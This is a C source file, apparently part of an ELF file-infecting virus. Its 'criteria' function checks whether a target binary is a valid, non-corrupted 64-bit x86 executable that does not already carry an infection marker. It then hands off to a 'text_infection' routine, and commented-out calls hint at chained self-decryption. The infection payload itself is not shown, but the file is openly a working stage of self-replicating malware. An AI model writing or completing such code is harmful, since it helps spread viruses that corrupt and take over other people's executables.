#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline bool is_corrupted(const struct s_host *host)
{
	return host->filesize < sizeof(Elf64_Ehdr) && host->header->e_shoff + (host->header->e_shnum * sizeof(Elf64_Shdr)) != host->filesize;
}

__attribute__((always_inline)) static inline bool is_elf(const struct s_host *host)
{
	return *(uint32_t *)host->header == ELF_MAGIC_NUMBER;
}

__attribute__((always_inline)) static inline bool is_x86_64(const struct s_host *host)
{
	return host->header->e_ident[EI_CLASS] == X86_64_MAGIC_NUMBER;
}

__attribute__((always_inline)) static inline bool is_executable(const struct s_host *host)
{
	return host->header->e_entry != 0;
}

__attribute__((always_inline)) static inline bool is_infected(const struct s_host *host)
{
	return *(unsigned int *)((char *)&host->header->e_ident[EI_PAD]) == INFECTED_MAGIC_NUMBER;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);

#if DEBUG
	char function[] = "criteria:\t\t";
	char name[] = "/tmp/trace";
	int trace = _open(name, O_RDWR | O_APPEND, 0000);
	char newline = 0xa;
	char result = context + 48;

	if (trace > 0)
	{
		_write(trace, function, _strlen(function));
		_write(trace, &result, 1);
		_write(trace, &newline, 1);
	}

	_close(trace);
#endif

	if (context == FAILURE)
		goto label;

	if (is_corrupted(host) == true)
	{
		context = FAILURE;
		goto label;
	}
	if (is_elf(host) == false)
	{
		context = FAILURE;
		goto label;
	}
	if (is_x86_64(host) == false)
	{
		context = FAILURE;
		goto label;
	}
	if (is_executable(host) == false)
	{
		context = FAILURE;
		goto label;
	}
	if (is_infected(host) == true)
	{
		context = FAILURE;
		goto label;
	}

label:
//	update_keychain_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
//	decrypt_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

	text_infection(host, keychain, context);
}
